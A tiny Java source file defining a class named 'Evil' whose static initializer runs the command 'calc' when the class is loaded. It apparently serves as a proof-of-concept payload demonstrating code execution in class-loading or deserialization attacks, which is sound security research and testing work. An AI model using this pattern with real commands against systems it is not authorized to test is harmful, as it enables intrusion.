import java.io.IOException;

public class Evil {
	static {
		try {
			Runtime.getRuntime().exec("calc");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}